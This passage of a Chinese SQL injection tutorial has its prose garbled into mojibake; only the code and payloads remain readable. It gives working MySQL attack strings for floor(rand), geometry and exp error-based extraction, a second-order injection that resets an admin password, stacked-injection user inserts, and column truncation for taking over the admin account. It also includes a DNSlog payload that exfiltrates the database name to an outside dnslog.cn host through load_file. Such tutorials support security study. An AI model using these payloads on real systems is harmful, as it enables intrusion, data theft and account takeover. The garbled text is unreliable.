¹æ®æ‹¼æ¥å­—æ®µalias_aå¯¹ç»“æœé›†è¿›è¡Œè®¡æ•°è¾“å‡ºã€‚ â€‹ åœ¨ä¸Šä¾‹ä¸­randå‡½æ•°ç”Ÿæˆçš„éšæœºæ•°ä¹˜ä»¥2çš„èŒƒå›´å°±æ˜¯0-2ï¼Œé‚£ä¹ˆå†ä½¿ç”¨floorå‡½æ•°è¿›è¡Œå‘ä¸‹å–æ•´ï¼Œå…¶å€¼å°±åªèƒ½æ˜¯0æˆ–è€…1ã€‚åŒæ—¶å› ä¸ºgroup by çš„ç‰¹æ€§ä½¿å¾—å…¶åœ¨è¿›è¡Œåˆ†ç»„çš„æ—¶å€™ä¼šå¯¹åé¢çš„å­—æ®µè¿›è¡Œä¸¤æ¬¡è¿ç®—ï¼Œgroup by åœ¨è¿›è¡Œåˆ†ç»„çš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸€å¼ è™šæ‹Ÿè¡¨è®°å½•æ•°æ®ï¼Œé‚£ä¹ˆå‡è®¾ä¸€ç§æƒ…å†µï¼Œå½“group byè¿›è¡Œç¬¬ä¸€æ¬¡è¿ç®—çš„æ—¶å€™ï¼Œå‘ç°è™šæ‹Ÿè¡¨ä¸­æ²¡æœ‰ç›¸åŒçš„æ•°æ®ï¼Œå‡†å¤‡è¿›è¡Œæ’å…¥æ“ä½œï¼Œä½†å› ä¸ºrandå‡½æ•°çš„éšæœºæ€§ï¼Œå¯¼è‡´åœ¨ç¬¬äºŒæ¬¡è¿ç®—çš„æ—¶å€™äº§ç”Ÿçš„ç»“æœåœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆåœ¨æ’å…¥è¯¥æ•°æ®çš„æ—¶å€™å°±ä¼šäº§ç”Ÿä¸»é”®å†²çªï¼Œä»è€Œäº§ç”ŸæŠ¥é”™ä¿¡æ¯ï¼Œå°†æˆ‘ä»¬éœ€è¦çš„æ•°æ®é€šè¿‡æŠ¥é”™ä¿¡æ¯å¤–å¸¦ã€‚ â€‹ ä¸‹ä¾‹æ˜¯æŸ¥è¯¢æ•°æ®åº“çš„payloadï¼ŒæŸ¥è¯¢è¡¨åçš„æ–¹æ³•å¦‚ä¸‹ï¼Œå…¶ä»–ä¿¡æ¯çš„æŸ¥è¯¢æ–¹æ³•è¯·è‡ªè¡Œæ€è€ƒ ?id=1' or (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor(rand(0)*2))alias_a from information_schema.tables group by alias_a)b)--+ å¯ä»¥æ€»ç»“å‡ºæ¥ä¸€ä¸ªæ¨¡æ¿ ?id=1' or (select 1 from (select count(*),concat((payload),floor(rand(0)*2)) from information_schema.tables group by alias_a)b)--+ â€‹ åªéœ€å°†ä¸Šé¢æ¨¡æ¿ä¸­çš„å†…å®¹æ›¿æ¢æˆä¸ºæˆ‘ä»¬çš„æŸ¥è¯¢payloadå³å¯,alias_aä¸bå‡æ˜¯å­—æ®µåˆ«å å‡ ä½•å‡½æ•°æ³¨å…¥ å¯ä»¥ä½¿ç”¨çš„å‡ ä½•å‡½æ•° geometrycollection:å­˜å‚¨ä»»æ„é›†åˆå›¾å½¢çš„é›†åˆ multipoint:å­˜å‚¨å¤šä¸ªç‚¹ polygon:å¤šè¾¹å½¢ multipolygon:å¤šä¸ªå¤šè¾¹å½¢ linstringï¼šçº¿ multilinestringï¼šå¤šæ¡çº¿ pointï¼šç‚¹ payload: select * from test where id=1 and mutilinestring((select*from(select * from (select user())a)b))) //æ„é€ è¯­æ³•éƒ½æ˜¯è¿™æ ·ã€‚ GeometryCollection((select * from (select * from(select user())a)b)) polygon((select * from(select * from(select user())a)b)) multipoint((select * from(select * from(select user())a)b)) multilinestring((select * from(select * from(select user())a)b)) LINESTRING((select * from(select * from(select user())a)b)) multipolygon((select * from(select * from(select user())a)b)) åªè¦ä¸Šè¿°å‡½æ•°ä¸­çš„å‚æ•°ä¸æ˜¯é›†åˆå½¢çŠ¶æ•°æ®ï¼Œå°±ä¼šæŠ¥é”™ã€‚æœ‰mysqlç‰ˆæœ¬é™åˆ¶ã€‚ä»¥ä¸Šåˆ—è¡¨ä¸­åŸºäºgeometric(é›†åˆå‡½æ•°)çš„æŠ¥é”™æ³¨å…¥åœ¨è¿™ä¸ª commit 5caea4 ä¸­è¢«ä¿®å¤ï¼Œåœ¨5.5.xè¾ƒåçš„ç‰ˆæœ¬ä¸­åŒæ ·ä¸å†ç”Ÿæ•ˆã€‚ åŸºäºæº¢å‡ºçš„æ³¨å…¥ ~ï¼šæŒ‰ä½å–åï¼ˆå¾—åˆ°æ•°æ®çš„äºŒè¿›åˆ¶åï¼ŒæŒ‰ä½å–åï¼‰ exp(3)ï¼šè‡ªç„¶å¯¹æ•°çš„3æ¬¡æ–¹ï¼Œå¾ˆå®¹æ˜“å°±æº¢å‡ºäº† select * from mysql.user where id=1 and exp(~(select * from (select user())a)); ~åçš„å†…å®¹è¢«å–ååä¼šå¾—åˆ°ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œå†åšä¸ºè‡ªç„¶å¯¹æ•°çš„æŒ‡æ•°ï¼Œå¾—åˆ°çš„å€¼ä¸€å®šä¼šæº¢å‡ºï¼Œä»è€ŒæŠ¥é”™å°†æŸ¥è¯¢ç»“æœæ˜¾ç¤ºå‡ºæ¥. åŸºäºexpå‡½æ•°çš„æŠ¥é”™æ³¨å…¥åœ¨MySQL 5.5.49åçš„ç‰ˆæœ¬å·²ç»ä¸å†ç”Ÿæ•ˆï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ä¸ª commit 95825f ã€‚ 4.2.4 äºŒæ¬¡æ³¨å…¥(äºŒé˜¶æ³¨å…¥) äºŒé˜¶æ³¨å…¥æ˜¯æŒ‡å·²å­˜åœ¨çš„ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œåœ¨ç”¨æˆ·å†æ¬¡ä½¿ç”¨è¯¥æ•°æ®çš„æ—¶å€™å¯¼è‡´çš„æ³¨å…¥ï¼Œè¿™ç§æ³¨å…¥ç±»å‹æ˜¯å¾ˆéš¾é€šè¿‡å·¥å…·æ‰«ææˆ–è€…é»‘ç›’æµ‹è¯•å‘ç°çš„ï¼Œå¾€å¾€éœ€è¦é€šè¿‡ç™½ç›’æµ‹è¯•æ‰èƒ½å‘ç°ã€‚æ¯”å¦‚ç°åœ¨æœ‰ä¸€ä¸ªç½‘ç«™æä¾›äº†ç”¨æˆ·æ³¨å†Œä¸ä¿®æ”¹å¯†ç çš„åŠŸèƒ½ã€‚åœ¨ç”¨æˆ·ç™»å½•çš„æ—¶å€™ï¼Œé€šè¿‡å‡½æ•°å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰ï¼Œå¦‚ ä¸“æœ‰åè¯ï¼š ç™½ç›’æµ‹è¯•ä¹Ÿç§°ä¸ºç»“æ„æµ‹è¯•ï¼Œä¸»è¦ç”¨äºæ£€æµ‹è½¯ä»¶ç¼–ç è¿‡ç¨‹ä¸­çš„é”™è¯¯ã€‚ç¨‹åºå‘˜çš„ç¼–ç¨‹ç»éªŒã€å¯¹ç¼–ç¨‹è½¯ä»¶çš„æŒæ¡ç¨‹åº¦ã€å·¥ä½œçŠ¶æ€ç­‰å› ç´ éƒ½ä¼šå½±å“åˆ°ç¼–ç¨‹è´¨é‡ï¼Œå¯¼è‡´ä»£ç é”™è¯¯ã€‚ é»‘ç›’æµ‹è¯•åˆç§°ä¸ºåŠŸèƒ½æµ‹è¯•ï¼Œä¸»è¦æ£€æµ‹è½¯ä»¶çš„æ¯ä¸€ä¸ªåŠŸèƒ½æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ã€‚åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå°†ç¨‹åºçœ‹æˆä¸èƒ½æ‰“å¼€çš„é»‘ç›’å­ï¼Œä¸è€ƒè™‘ç¨‹åºå†…éƒ¨ç»“æ„å’Œç‰¹æ€§çš„åŸºç¡€ä¸Šé€šè¿‡ç¨‹åºæ¥å£è¿›è¡Œæµ‹è¯•ï¼Œæ£€æŸ¥ç¨‹åºåŠŸèƒ½æ˜¯å¦æŒ‰ç…§è®¾è®¡éœ€æ±‚ä»¥åŠè¯´æ˜ä¹¦çš„è§„å®šèƒ½å¤Ÿæ­£å¸¸æ‰“å¼€ä½¿ç”¨ã€‚ $link = @mysqli_connect($host,$username,$password,$dbname,$port); $username=mysql_real_escape_string($_POST['username']); $passwd=mysql_real_escape_string($_POST['passwd']); $repasswd=mysql_real_escape_string($_POST['repasswd']); if ($passwd==$repasswd){ $query=\"select * from t_user where username='{$username}' and passwd=='{$passwd}'\"; $res=@mysqli_query($link,$query); if (mysqli_num_rows($res)==1){ //ç™»å½•æˆåŠŸ }else{ die('ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯') } }else{ die(\"ä¸¤æ¬¡è¾“å…¥å¯†ç ä¸ä¸€è‡´\") } å¯ä»¥çœ‹åˆ°åœ¨ç™»å½•ç•Œé¢ï¼Œç”¨æˆ·åä¸å¯†ç è¢«mysql_real_escape_stringå‡½æ•°åšäº†è½¬ä¹‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¾“å…¥çš„å•å¼•å·æˆ–è€…åŒå¼•å·å°±å¤±å»äº†ä½œç”¨ï¼Œäºæ˜¯æˆ‘ä»¬ä¸èƒ½é€šè¿‡ç®€å•ä¸€æ¬¡æ³¨å…¥è·å–æ•°æ®ã€‚å†çœ‹ç”¨æˆ·æ³¨å†Œç•Œé¢çš„ä»£ç  $link = @mysqli_connect($host,$username,$password,$dbname,$port); $username=mysql_escape_string($_POST['username']); $passwd=mysql_escape_string($_POST['passwd']); $repasswd=mysql_escape_string($_POST['repasswd']); if ($passwd==$repasswd){ $query=\"select * from t_user where username='{$username}'\"; $res=@mysqli_query($link,$query); if (mysqli_num_rows($res)!=0){ //å½“å‰ç”¨æˆ·å·²å­˜åœ¨ }else{ $query=\"insert into user values ('{$username}','{$passwd}')\"; $res=@mysqli_query($link,$query); if (mysqli_affected_rows=1){ //æ–°å¢ç”¨æˆ·æˆåŠŸ }else{ //æœªçŸ¥é”™è¯¯ï¼Œè¯·æ£€æŸ¥åå†è¾“å…¥ } } }else{ die(\"ä¸¤æ¬¡è¾“å…¥å¯†ç ä¸ä¸€è‡´\"); } å¯ä»¥çœ‹åˆ°æ³¨å†Œç•Œé¢çš„è¾“å…¥ä¹Ÿè¢«è½¬ä¹‰äº†ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹ï¼Œéœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œç»è¿‡msql_real_escape_stringå’Œaddsashesè½¬ä¹‰çš„å­—ç¬¦åœ¨æ’å…¥åˆ°æ•°æ®åº“ä¸­ä¹‹åï¼Œä¼šè¢«è§£è½¬ä¹‰ï¼Œä¸ç„¶æˆ‘ä»¬æ³¨å†Œçš„ç”¨æˆ·åå°±å˜äº†ã€‚åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬å°±å¯ä»¥æäº‹æƒ…äº†ã€‚åœ¨ç”¨æˆ·ä¿®æ”¹å¯†ç æ—¶ç”±è¿™æ ·çš„è¯­å¥ $link = @mysqli_connect($host,$username,$password,$dbname,$port); $username=mysql_escape_string($_POST['username']); $oldpasswd=mysql_escape_string($_POST['oldpasswd']); $newpasswd=mysql_escape_string($_POST['newpasswd']); $repasswd=mysql_escape_string($_POST['repasswd']); //é¦–å…ˆåˆ¤æ–­ç”¨æˆ·åå¯†ç æ˜¯å¦æ­£ç¡® $query=\"select * from t_user where username='{$username}' and passwd='{$oldpasswd}'\"; $res=@mysqli_query($link,$query); if ($newpasswd==$repasswd &amp;&amp; mysqli_num_rows($res)!=0){ $query=\"update t_user set passwd='{$newpasswd}' where username='{$username}'\"; $res=@mysqli_query($link,$query); if (mysqli_affected_rows=1){ //å¯†ç ä¿®æ”¹æˆåŠŸ }else{ //æœªçŸ¥é”™è¯¯ï¼Œè¯·æ£€æŸ¥åå†è¾“å…¥ } }else{ die(\"ä¸¤æ¬¡è¾“å…¥å¯†ç ä¸ä¸€è‡´æˆ–è€…ç”¨æˆ·åæˆ–è€…è€å¯†ç è¾“å…¥é”™è¯¯\"); } å‡å¦‚æˆ‘ä»¬çŸ¥é“æœ‰ä¸€ä¸ªç”¨æˆ·åä¸ºadminçš„ç®¡ç†å‘˜è´¦æˆ·ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå¯ä»¥æ³¨å†Œä¸€ä¸ªadminâ€™#çš„è´¦å·ï¼Œâ€™#æ ¹æ®å®é™…æƒ…å†µç¡®å®šï¼Œå¯†ç ä¸º123456ï¼Œç„¶åæˆ‘ä»¬æ­£å¸¸ç™»å½•åˆ°æˆ‘ä»¬æ–°æ³¨å†Œçš„è´¦å·ï¼Œè·³è½¬åˆ°ä¿®æ”¹å¯†ç çš„ç•Œé¢ï¼Œç„¶åè¾“å…¥ç”¨æˆ·åä¸å¯†ç ä¹‹åç‚¹å‡»ç¡®è®¤ï¼Œè¿™æ—¶å€™åå°çš„updateè¯­å¥å˜æˆäº† $query=\"update t_user set passwd=654321 where username='admin'#'\"; æ‰€ä»¥è¿™æ—¶å€™å°±ä¿®æ”¹äº†è´¦æˆ·åä¸ºadminçš„å¯†ç ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨æˆ‘ä»¬çš„æ–°å¯†ç ç›´æ¥ç™»å½•ç®¡ç†å‘˜è´¦æˆ·adminäº†ã€‚å¤§å®¶å¯ä»¥åˆ°sqli_labsé¶åœºç¬¬24å…³è¿›è¡Œè¯•éªŒã€‚ 4.2.5 å †å æ³¨å…¥ mysqli_multi_query()å‡½æ•°ï¼š Stackedinjections:å †å æ³¨å…¥ã€‚ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å †sqlè¯­å¥ï¼ˆå¤šæ¡ï¼‰ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨mysqlä¸­ï¼Œä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­ï¼Œæ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ  ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åšå †å æ³¨å…¥ åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsql è¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œ unioninjectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ ä½¿ç”¨æ¡ä»¶ mysqli_multi_queryï¼ˆï¼‰æ‰§è¡Œå¤šæ¡æŸ¥è¯¢çš„å‡½æ•°â€”â€”é˜²æ­¢æ³¨å…¥æ”¹æˆmysqli_query()å‡½æ•° å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œå…¶å¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ï¼Œåˆæˆ–è€…æƒé™çš„é™åˆ¶åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œåˆ©ç”¨**mysqli_multi_query()**å‡½æ•°å°±æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œï¼Œæ‰€ä»¥å¯ä»¥è¯´å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œä¸€æ—¦èƒ½å¤Ÿè¢«ä½¿ç”¨ï¼Œå°†å¯èƒ½å¯¹ç½‘ç«™é€ æˆååˆ†å¤§çš„å¨èƒã€‚ æˆ‘ä»¬å°±å¯ä»¥åœ¨æ™®é€šæ³¨å…¥çš„åé¢ï¼Œå†™ä¸Šä¸€æ¡ä»»æ„çš„SQLè¯­å¥ï¼Œä¾‹å¦‚æ’å…¥æ•°æ®ï¼Œæˆ–è€…åˆ åº“ã€‚ ?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ ?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+ //æ‰§è¡Œå®Œä¸Šè¿°è¯­å¥ï¼Œæˆ‘ä»¬å¾—çŸ¥äº†åˆ—åï¼Œæ­¤æ—¶æˆ‘ä»¬æ ¹æ®å…·ä½“åˆ—åï¼Œè¿›è¡ŒsqlæŸ¥è¯¢ï¼Œåˆ é™¤ç­‰è¯­å¥çš„æ‰§è¡Œ ?id=-1' ;insert into users(id,username,password)values(115,'1234','4567'); ?id=-1' ;insert into users(id,username,password)values(100,'772211','112277'); éšåæ‰§è¡Œ?id=56ï¼Œå¯ä»¥çœ‹åˆ°è‡ªå·±æˆåŠŸæ’å…¥äº†å¯†ç ç”¨æˆ·å 4.2.6 å°tip: mysqlé•¿å­—ç¬¦æˆªæ–­ mysqlä¸­æœ‰ä¸€ä¸ªç¯å¢ƒå˜é‡é…ç½®sql_mode,å®šä¹‰äº†mysqlåº”è¯¥æ”¯æŒçš„sqlè¯­æ³•ï¼Œæ•°æ®æ ¡éªŒç­‰,å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æŸ¥çœ‹å½“å‰æ•°æ®åº“ä½¿ç”¨çš„sql_modeï¼š select @@sql_mode å…·ä½“çš„å‚æ•°è§£é‡Šè§å‚è€ƒèµ„æ–™5ï¼šMySQLçš„sql_modeæ¨¡å¼ï¼Œmysql5.0ç‰ˆæœ¬ä»¥ä¸Šæ”¯æŒäº†ä¸‰ç§sql_modeæ¨¡å¼ï¼Œå¦‚ä¸‹ï¼š é»˜è®¤æƒ…å†µä¸‹ï¼Œmysqlé€‰æ‹©ä½¿ç”¨çš„æ˜¯ä¸¥æ ¼æ¨¡å¼ï¼Œæ­¤æ—¶å¦‚æœæ’å…¥çš„æ•°æ®è¶…è¿‡é™åˆ¶é•¿åº¦ï¼Œåˆ™ä¼šæŠ¥é”™error(å¦‚æœè¶…å‡ºçš„é•¿åº¦æ˜¯ç”±ç©ºæ ¼å¼•èµ·çš„ï¼Œå¯èƒ½åªä¼šè­¦å‘Šwarningï¼Œå®é™…æ“ä½œè¯æ˜ï¼Œä¸‰ç§æ¨¡å¼ä¸‹ï¼Œå¦‚æœæ’å…¥çš„è¶…å‡ºé•¿åº¦æ˜¯ç”±ç©ºæ ¼å¼•èµ·çš„ï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼Œä»…ä»…ä¼šè­¦å‘Šï¼Œæœ¬èŠ‚æœ€åç»™å‡ºç»“æœ): describe users; insert into users values (1,'admin','123');#æ­£å¸¸æ’å…¥ insert into users values (2,'admin ','123'); #usernameé™åˆ¶7ä¸ªå­—ç¬¦ï¼Œè¿™é‡Œæ’å…¥8ä¸ªå­—ç¬¦ï¼ˆå3ä¸ªä¸ºç©ºæ ¼ï¼Œæ’å…¥æˆåŠŸï¼Œå‡ºç°è­¦å‘Šï¼‰ï¼Œå‡ºç°æˆªæ–­æƒ…å†µ insert into users values (3,'admin x','1234');#æŠ¥é”™ï¼Œæé†’è¶…é•¿å­—ç¬¦ å¯¹äºid=2çš„æ’å…¥ï¼Œå¯ä»¥æŸ¥çœ‹å…¶usernsmeçš„é•¿åº¦,å‘ç°å…¶é•¿åº¦ä¸º7: select length(username) from users where id = 2; ä¸‹é¢é‡ç‚¹è®¨è®ºå½“sql_modeæ¨¡å¼ä¸ºANSIæ—¶å¼•èµ·çš„é•¿å­—ç¬¦æˆªæ–­é—®é¢˜ï¼š é¦–å…ˆå°†sql_modeè®¾ç½®ä¸ºANSIæ¨¡å¼ï¼š SET @@sql_mode=ANSI; æ¥ä¸‹æ¥ä¾æ¬¡åˆ›å»ºtable,æ’å…¥æ•°æ®ï¼Œè¿™é‡Œå‘ç°username='admin xâ€™ä¹Ÿæ’å…¥æˆåŠŸäº†ï¼š create table users( -&gt; id int(11) NOT NULL, -&gt; username varchar(7) NOT NULL, -&gt; password varchar(12) NOT NULL);#åˆ›å»ºusersè¡¨æ ¼ insert into users values (1,'admin',123);#æ­£å¸¸æ’å…¥ insert into users values (2,'admin ',1234);#è­¦å‘Šï¼Œæ’å…¥æˆåŠŸ insert into users values (3,'admin x',12345);#è­¦å‘Šï¼Œæ’å…¥æˆåŠŸ è§‚å¯Ÿä¸€ä¸‹å„ä¸ªç”¨æˆ·çš„é•¿åº¦ï¼Œå¯ä»¥å‘ç°id=2,id=3çš„usernameå‡è¢«æˆªæ–­ï¼Œé•¿åº¦éƒ½å˜æˆäº†7ï¼š select *from users; select length(username) from users where id =1; select length(username) from users where id =2; select length(username) from users where id =3; å¦‚æœæ­¤æ—¶é€‰æ‹©username= 'adminâ€™ä¼šå‡ºç°ä¸‹é¢æƒ…å†µï¼š select username from users where username = 'admin'; æ­¤æ—¶ï¼Œæˆ‘ä»¬åªæŸ¥è¯¢äº†ç”¨æˆ·åä¸ºadminçš„ç”¨æˆ·ï¼Œä½†å¦å¤–ä¸¤ä¸ªé•¿åº¦ä¸ä¸€è‡´çš„ç”¨æˆ·å´å‡ºç°ï¼Œè¿™ä¼šé€ æˆå®‰å…¨é—®é¢˜ã€‚å‡å¦‚ï¼ŒæŸä¸ªç®¡ç†å‘˜çš„ç”¨æˆ·åå°±æ˜¯admin,ä»–é‡‡ç”¨ä¸‹é¢çš„è¯­å¥ç™»å½•ï¼š $sql = \"select count ( * ) from users where username = â€˜adminâ€™ and password = â€˜*****â€™ \"; æ­¤æ—¶ï¼Œæˆ‘ä»¬åªè¦ä¼ªé€ ç”¨æˆ·â€™admin xâ€™ä¾¿å¯ä»¥è·å¾—ç®¡ç†å‘˜çš„ä¿¡æ¯ï¼Œä»è€Œè¿›å…¥åå°ã€‚ è¡¥å……ï¼š å¯¹äºä¸‰ç§æ¨¡å¼ä¸‹çš„ç©ºæ ¼æ’å…¥æº¢å‡ºï¼Œå¹¶ä¸ä¼šæŠ¥é”™ï¼Œç»“æœå¦‚ä¸‹ï¼š SET @@sql_mode=STRICT_TRANS_TABLES; insert into users values (4,'admin ',12345); insert into users values (5,'admin x',12345); SET @@sql_mode=TRADITIONAL; insert into users values (6,'admin ',123456); insert into users values (7,'admin x',123456); ç”±æ­¤å¯è§ï¼Œé¢„é˜²é•¿å­—ç¬¦æˆªæ–­é—®é¢˜å¯èƒ½éœ€è¦ä»å…¶ä»–åœ°æ–¹å…¥æ‰‹ï¼Œå¦‚è´¦å·ç”±ç®¡ç†å‘˜åˆ†é…å¹¶é™åˆ¶æ›´æ”¹ï¼›å¯¹æ•°æ®åº“å†…å®¹åŠ å¯†ï¼Œå³ä½¿è·å–åˆ°ç›¸å…³ä¿¡æ¯ä¹Ÿæ— æ³•ç ´è§£ã€‚ å‡è®¾ç®¡ç†å‘˜çš„è´¦å·å°±æ˜¯adminï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å»æ³¨å†Œä¸€ä¸ªadmin çš„ç”¨æˆ·.(PS:åé¢æœ‰å“¦å¾ˆå¤šç©ºæ ¼ï¼Œç­‰å¾…è¢«æˆªå–æ‰å°±ç›´æ¥æ›¿æ¢æ‰adminè¿™ä¸ªè´¦å·äº†)ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥ç™»å½•è´¦æˆ·åä¸ºadminçš„è´¦å·äº†ã€‚ 4.3æ— å›æ˜¾ 4.3.1 DNS Log æˆ‘ä»¬åœ¨å‘èµ·ç½‘ç»œè¯·æ±‚çš„æ—¶å€™ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯è§£æåŸŸåï¼Œå½“åŸŸåè¢«æˆåŠŸè§£æçš„æ—¶å€™ï¼Œè¯¥åŸŸåè§£æç»“æœå°†è¢«åŸŸåæœåŠ¡å™¨è®°å½•ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ©ç”¨çš„æ­£æ˜¯è¿™ä¸€ç‚¹ï¼Œå°†æˆ‘ä»¬æƒ³è¦çš„æ•°æ®æ”¾åœ¨åŸŸåçš„ä¸‹ä¸€çº§åŸŸä¸­å¤–å¸¦åˆ°åŸŸåæœåŠ¡å™¨ï¼Œé€šè¿‡æŸ¥è¯¢åŸŸåæœåŠ¡å™¨çš„æ—¥å¿—ï¼Œä»è€Œè·å¾—æˆ‘ä»¬æƒ³è¦çš„æ•°æ®ï¼Œå¦‚æˆ‘ä»¬ä½¿ç”¨www.dnslog.cn è¿™ä¸ªç½‘ç«™æ¥æµ‹è¯• pingå‘½ä»¤æµ‹è¯•ï¼š ç‚¹å‡»è·å–å­åŸŸåè·å–ä¸€ä¸ªåŒ…å«ä¸‰çº§åŸŸåçš„åŸŸåç»™æˆ‘ä»¬ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨pingå‘½ä»¤åšæµ‹è¯• ping %USERNAME%.4ap7wz.dnslog.cn å½“pingé€šçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç‚¹å‡»è¯¥ç½‘ç«™çš„åˆ·æ–°è®°å½•å°±å¯ä»¥çœ‹åˆ°æˆ‘æµ‹è¯•ä¸»æœºçš„ç”¨æˆ·åChinaArmandäº†ã€‚è¯¥æ³¨å…¥æ–¹æ³•é€‚ç”¨äºéœ€è¦æ—¶é—´ç›²æ³¨ã€æ²¡æœ‰å›æ˜¾çš„æ³¨å…¥åœºæ™¯ã€‚æ„é€ mysqlè¯­å¥å¦‚ä¸‹ ?id=1' and (select load_file(concat('\\\\\\\\',(select database()),'.4ap7wz.dnslog.cn\\\\abc'))) åœ¨åˆ°www.dnslog.cnçœ‹çœ‹æ˜¯ä¸æ˜¯è·å–åˆ°äº†æˆ‘ä»¬çš„æ•°æ®åº“å,æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„è¯­å¥ä½¿ç”¨äº†\\ï¼Œè¿™æ˜¯windowsUNCè·¯å¾„çš„è¡¨ç¤ºæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨SQLIä¸­DNSLogåªé€‚ç”¨äºwindowså¹³å°çš„æœåŠ¡å™¨ ã€‚ uncè·¯å¾„ï¼Œæ˜¯åœ¨windowså¹³å°ä¸Šè®¿é—®å±€åŸŸç½‘ç½‘ç»œèµ„æºçš„ä¸€ç§è·¯å¾„è¡¨ç¤ºæ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨windowä¸Šä½¿ç”¨çš„æ–‡ä»¶å…±äº«æœåŠ¡è·¯å¾„å°±æ˜¯é€šè¿‡è¿™ç§æ–¹å¼ï¼Œ\\172.16.11.24 è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆåªèƒ½åœ¨windowå¹³å°çš„æœåŠ¡å™¨ä¸Šæœ‰æ•ˆï¼Œå¦å¤–å¤šå‡ºæ¥çš„ä¸¤ä¸ª\\è¡¨ç¤ºè½¬ä¹‰ã€‚ load_file å—mysqlé…ç½®æ–‡ä»¶ä¸­secure_file_privé€‰é¡¹çš„é™åˆ¶ï¼Œ secure_file_priv= //å…è®¸æ‰€æœ‰ secure_file_priv=\"G:\\\" //å…è®¸åŠ è½½Gç›˜ secure_file_priv=null //æ‹’ç» DNSlog ä»‹ç» 